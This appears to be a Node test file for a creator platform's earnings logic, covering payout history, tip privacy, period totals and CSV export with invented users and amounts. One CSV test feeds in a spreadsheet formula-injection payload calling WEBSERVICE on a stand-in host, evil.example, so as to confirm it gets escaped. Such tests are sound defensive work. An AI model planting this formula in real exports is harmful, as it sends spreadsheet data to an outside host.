// node scripts/test-creator-money.mjs — the creator's Money page maths
// (lib/creatorMoneyRules.js).
import assert from 'node:assert/strict';
import { buildHistory, laneTotals, owedCents, paidInYearCents, monthRange, yearRange, rangeFor, periodOf, periodsBetween, periodLabel, toCsv, signed, dollars } from '../lib/creatorMoneyRules.js';

let n = 0;
const t = (name, fn) => { fn(); n += 1; console.log('ok', name); };

// user_anika shares her name in Artist Support; user_jose is also a member who doesn't.
const names = { user_jose: 'J. Hernandez', user_pp: 'Post Puppeteers', user_anika: 'Anika K.' };
const memberNames = { user_anika: 'Anika K.' };
const rows = {
  ledger: [
    { id: 'l1', kind: 'member_share', cents: 350, basis: 'picks', member_id: 'user_anika', payout_id: null, created_at: '2026-10-16T10:00:00Z' },
    { id: 'l2', kind: 'member_share', cents: 200, basis: 'watched', member_id: 'user_hidden', payout_id: null, created_at: '2026-10-16T10:01:00Z' },
    { id: 'l3', kind: 'referral', cents: 150, member_id: 'user_jose', payout_id: null, created_at: '2026-10-14T10:00:00Z' },
    { id: 'l4', kind: 'member_share', cents: 960, basis: 'pool', member_id: null, payout_id: null, created_at: '2026-09-20T10:00:00Z' },
    { id: 'l5', kind: 'member_share', cents: 2280, basis: 'picks', member_id: 'user_anika', payout_id: 'p1', created_at: '2026-09-02T10:00:00Z' },
    { id: 'l6', kind: 'payout', cents: -2280, payout_id: 'p1', created_at: '2026-10-01T09:00:00Z' }
  ],
  purchases: [
    { id: 'pu1', status: 'completed', title: 'The Salt Hours', target_type: 'episode', target_id: 'e1', paid_cents: 499, creator_cents: 357, completed_at: '2026-10-22T18:00:00Z', stripe_payment_intent_id: 'pi_1' },
    { id: 'pu2', status: 'refunded', title: 'Paper Moon Motel', target_type: 'episode', target_id: 'e2', paid_cents: 349, creator_cents: 226, completed_at: '2026-10-05T18:00:00Z', refunded_at: '2026-10-09T18:00:00Z', refund_kind: 'self' },
    { id: 'pu3', status: 'failed', title: 'Nope', target_type: 'episode', target_id: 'e3', paid_cents: 349, creator_cents: 226, created_at: '2026-10-05T18:00:00Z' }
  ],
  donations: [
    { id: 'd1', pitch_id: 'pitch1', donor_user_id: 'user_jose', amount_cents: 9500, creator_payout_cents: 9025, status: 'completed', completed_at: '2026-10-12T12:00:00Z', stripe_charge_id: 'pi_d1' },
    { id: 'd2', pitch_id: 'pitch1', donor_user_id: 'user_x', amount_cents: 5000, creator_payout_cents: 4750, status: 'disputed', completed_at: '2026-09-20T12:00:00Z', disputed_at: '2026-09-30T12:00:00Z', dispute_status: 'open', clawback_cents: 4750 }
  ],
  bookings: [
    { id: 'b1', location_id: 'loc1', producer_id: 'user_pp', starts_on: '2026-10-24', ends_on: '2026-10-24', project_title: 'Fawns', status: 'paid', paid_at: '2026-10-20T12:00:00Z', host_payout_cents: 61025, platform_cut_cents: 6775, total_charged_cents: 69800, stripe_payment_intent_id: 'pi_b1' },
    { id: 'b2', location_id: 'loc1', producer_id: 'user_pp', starts_on: '2026-08-10', ends_on: '2026-08-11', status: 'refunded', paid_at: '2026-08-01T12:00:00Z', refunded_at: '2026-08-05T12:00:00Z', refund_cents: 34900, host_payout_cents: 61025, platform_cut_cents: 6775, total_charged_cents: 69800 }
  ],
  payouts: [
    { id: 'p1', period: '2026-09', cents: 2280, status: 'paid', stripe_transfer_id: 'tr_1', paid_at: '2026-10-01T09:00:00Z', created_at: '2026-10-01T09:00:00Z', reversed_cents: 0 },
    { id: 'p0', period: '2026-07', cents: 3000, status: 'paid', stripe_transfer_id: 'tr_0', paid_at: '2026-08-01T09:00:00Z', created_at: '2026-08-01T09:00:00Z', reversed_cents: 1000, reversed_at: '2026-08-15T09:00:00Z' }
  ],
  // Tips: Anika shows her name; the $10 tipper didn't; Jose's note is hidden; one refunded.
  tips: [
    { id: 't1', tipper_id: 'user_anika', show_name: true, amount_cents: 500, creator_payout_cents: 475, platform_cut_cents: 25, note: 'the sound design in Low Tide!!', status: 'completed', completed_at: '2026-10-16T12:00:00Z', stripe_payment_intent_id: 'pi_t1' },
    { id: 't2', tipper_id: 'user_x', show_name: false, amount_cents: 1000, creator_payout_cents: 950, platform_cut_cents: 50, note: null, status: 'completed', completed_at: '2026-10-15T12:00:00Z', stripe_payment_intent_id: 'pi_t2' },
    { id: 't3', tipper_id: 'user_jose', show_name: true, amount_cents: 300, creator_payout_cents: 285, platform_cut_cents: 15, note: 'rude thing', note_hidden: true, status: 'completed', completed_at: '2026-10-09T12:00:00Z', stripe_payment_intent_id: 'pi_t3' },
    { id: 't4', tipper_id: 'user_x', show_name: false, amount_cents: 500, creator_payout_cents: 475, platform_cut_cents: 25, note: 'oops', status: 'refunded', completed_at: '2026-10-03T12:00:00Z', refunded_at: '2026-10-04T12:00:00Z', refund_reason: 'wrong amount', stripe_payment_intent_id: 'pi_t4' },
    { id: 't5', tipper_id: 'user_x', show_name: false, amount_cents: 500, creator_payout_cents: 475, platform_cut_cents: 25, status: 'pending', created_at: '2026-10-20T12:00:00Z' }
  ],
  names,
  memberNames,
  tipperNames: { user_anika: 'Anika K.', user_jose: 'J. Hernandez', user_x: 'Should Not Show' },
  pitchTitles: { pitch1: 'Fawns' },
  locationTitles: { loc1: 'The Glass House' }
};

t('periods: keys, ranges and labels', () => {
  assert.equal(periodOf(new Date('2026-10-23T18:00:00Z')), '2026-10');
  assert.deepEqual(monthRange('2026-10'), { start: '2026-10-01T00:00:00.000Z', end: '2026-11-01T00:00:00.000Z' });
  assert.deepEqual(yearRange('2026'), { start: '2026-01-01T00:00:00.000Z', end: '2027-01-01T00:00:00.000Z' });
  assert.equal(rangeFor('2026').start, '2026-01-01T00:00:00.000Z');
  assert.equal(periodLabel('2026-10'), 'October 2026');
  assert.deepEqual(periodsBetween('2026-08-15T00:00:00Z', new Date('2026-10-23T00:00:00Z')), ['2026-10', '2026-09', '2026-08']);
  assert.deepEqual(periodsBetween(null, new Date('2026-10-23T00:00:00Z')), ['2026-10']);
  assert.equal(periodsBetween('2020-01-01T00:00:00Z', new Date('2026-10-23T00:00:00Z')).length, 24);
});

const lines = buildHistory(rows);

t('history: one line per thing that happened, newest first, names only where allowed', () => {
  assert.ok(lines.every((l, i) => i === 0 || lines[i - 1].at >= l.at));
  const sale = lines.find((l) => l.id === 'sale:pu1');
  assert.equal(sale.lane, 'sales');
  assert.equal(sale.detail, '$4.99 · a buyer');
  assert.equal(sale.cents, 357);
  const refund = lines.find((l) => l.id === 'sale-refund:pu2');
  assert.equal(refund.cents, -226);
  assert.equal(refund.kind, 'refund');
  assert.ok(!lines.find((l) => l.id === 'sale:pu3'), 'a failed purchase is not a line');
  const share = lines.find((l) => l.id === 'ledger:l1');
  assert.equal(share.detail, 'Anika K. · picked you');
  assert.equal(share.where, 'Owed · pays on the 1st');
  const hidden = lines.find((l) => l.id === 'ledger:l2');
  assert.equal(hidden.detail, 'A member · by watching');
  const ref = lines.find((l) => l.id === 'ledger:l3');
  assert.equal(ref.detail, 'A member you brought renewed', 'a backer who is also a member stays anonymous on membership lines');
  const paidShare = lines.find((l) => l.id === 'ledger:l5');
  assert.equal(paidShare.where, 'Paid out');
  assert.ok(!lines.find((l) => l.id === 'ledger:l6'), 'ledger payout lines are replaced by the payout rows');
  const backing = lines.find((l) => l.id === 'backing:d1');
  assert.equal(backing.detail, 'J. Hernandez backed $95.00');
  assert.equal(backing.cents, 9025);
  const dispute = lines.find((l) => l.id === 'backing-dispute:d2');
  assert.equal(dispute.cents, -4750);
  assert.match(dispute.detail, /A backer disputed \$50.00 · waiting on the bank/);
  const booking = lines.find((l) => l.id === 'booking:b1');
  assert.equal(booking.detail, 'Post Puppeteers · Oct 24 · Fawns');
  assert.equal(booking.cents, 61025);
  const bRefund = lines.find((l) => l.id === 'booking-refund:b2');
  assert.equal(bRefund.cents, -Math.round(34900 * 61025 / 69800));
  const payout = lines.find((l) => l.id === 'payout:p1');
  assert.equal(payout.lane, 'payouts');
  assert.equal(payout.where, 'Moved to your Stripe balance');
  assert.equal(payout.detail, 'September 2026 · transfer tr_1');
  const returned = lines.find((l) => l.id === 'payout-reversed:p0');
  assert.equal(returned.cents, -1000);
  assert.equal(lines.find((l) => l.id === 'payout:p0').status, 'partly_reversed');
});

t('tips: the note is the line, names only where the fan chose, hidden notes stay hidden', () => {
  const t1 = lines.find((l) => l.id === 'tip:t1');
  assert.equal(t1.lane, 'tips');
  assert.equal(t1.label, 'Anika K.');
  assert.equal(t1.detail, '“the sound design in Low Tide!!”');
  assert.equal(t1.cents, 475);
  assert.equal(t1.tipId, 't1');
  assert.equal(t1.noteHidden, false);
  const t2 = lines.find((l) => l.id === 'tip:t2');
  assert.equal(t2.label, 'A fan', 'show_name off hides the name even when we know it');
  assert.equal(t2.detail, 'no note');
  const t3 = lines.find((l) => l.id === 'tip:t3');
  assert.equal(t3.detail, 'note hidden by you');
  assert.equal(t3.noteHidden, true);
  const refund = lines.find((l) => l.id === 'tip-refund:t4');
  assert.equal(refund.cents, -475);
  assert.equal(refund.detail, 'Refunded by the studio · wrong amount');
  assert.ok(!lines.find((l) => l.id === 'tip:t5'), 'a pending tip is not a line');
});

t('lane totals for October: refunds net out, payouts never count', () => {
  const o = laneTotals(lines, monthRange('2026-10'));
  assert.equal(o.member_support, 700);
  assert.equal(o.memberShare, 550);
  assert.equal(o.referral, 150);
  assert.equal(o.sales, 357 - 226 + 226); // pu2's sale was in October too; its refund nets it out
  assert.equal(o.backing, 9025);
  assert.equal(o.bookings, 61025);
  assert.equal(o.payouts, 2280);
  assert.equal(o.tips, 475 + 950 + 285); // t4's tip and refund net out
  assert.equal(o.total, 700 + 357 + 9025 + 61025 + 1710);
  assert.equal(o.refunds, -226 - 475);
  assert.equal(o.count.sales, 3);
  assert.equal(o.count.tips, 5);
});

t('owed: unpaid earnings lines, whatever the month', () => {
  assert.equal(owedCents(rows.ledger), 350 + 200 + 150 + 960);
});

t('paid this year: transfers that went through less what came back, plus the card lanes net', () => {
  const paid = paidInYearCents(lines, '2026');
  const transfers = 2280 + 3000 - 1000;
  // d2's $50 backing came in (+4750) and was disputed (−4750); b2's booking came in and was partly refunded.
  const card = 357 - 226 + 226 + 9025 + 4750 - 4750 + 61025 + 61025 - Math.round(34900 * 61025 / 69800) + 1710;
  assert.equal(paid, transfers + card);
  assert.equal(paidInYearCents(lines, '2025'), 0);
});

t('csv: a header and one row per line, quoted where needed', () => {
  const csv = toCsv(lines.filter((l) => l.lane === 'sales'));
  const [head, ...body] = csv.trim().split('\n');
  assert.equal(head, 'date,lane,kind,what,detail,where,yours_usd,source');
  assert.equal(body.length, 3);
  // A sale names its own row, never the buyer's Stripe payment.
  assert.equal(body[0], '2026-10-22,Title sales,sale,The Salt Hours,$4.99 · a buyer,Stripe balance,3.57,pu1');
  assert.equal(toCsv([{ at: '2026-10-01T00:00:00Z', lane: 'sales', kind: 'sale', label: 'Night, Bus', detail: 'said "hi"', where: 'x', cents: 100 }]).split('\n')[1], '2026-10-01,Title sales,sale,"Night, Bus","said ""hi""",x,1.00,');
});

t('csv: text that would run as a formula is neutralised, amounts stay numbers', () => {
  const row = toCsv([{ at: '2026-10-01T00:00:00Z', lane: 'tips', kind: 'tip', label: '=WEBSERVICE("https://evil.example/?"&D2)', detail: '+1', where: '@x', cents: -226 }]).split('\n')[1];
  assert.equal(row, `2026-10-01,Tips,tip,"'=WEBSERVICE(""https://evil.example/?""&D2)",'+1,'@x,-2.26,`);
});

t('money strings', () => {
  assert.equal(dollars(357), '$3.57');
  assert.equal(dollars(-226), '−$2.26');
  assert.equal(signed(357, 'sales'), '+$3.57');
  assert.equal(signed(-226, 'sales'), '−$2.26');
  assert.equal(signed(2280, 'payouts'), '$22.80');
});

console.log(`${n} passed`);
